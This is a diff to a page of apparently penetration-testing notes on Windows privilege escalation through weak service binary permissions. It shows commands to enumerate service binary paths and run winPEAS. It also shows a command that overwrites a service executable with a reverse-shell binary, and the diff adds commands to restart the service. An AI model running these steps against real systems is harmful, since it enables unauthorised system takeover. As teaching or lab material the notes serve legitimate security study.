@@ -35,7 +35,7 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
-Or we can use the `servicesinfo` module of winpeas
+Or we can use the `servicesinfo` module of [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
 ```powershell
 winPEASx64.exe servicesinfo
@@ -47,6 +47,19 @@ We just have to replace the binary.
 
 ```powershell
 copy /y c:\Temp\reverse.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+```
+And then, restart the service
+```powershell
+#Using wmic
+wmic service <Service_Name> call stopservice
+wmic service <Service_Name> call startservice
+
+#Using net
+net stop <Service_Name> && net start <Service_Name>
+
+#Using sc.exe
+sc.exe stop <Service_Name>
+sc.exe start <Service_Name>
 ```
 {% endtab %}
 {% endtabs %}
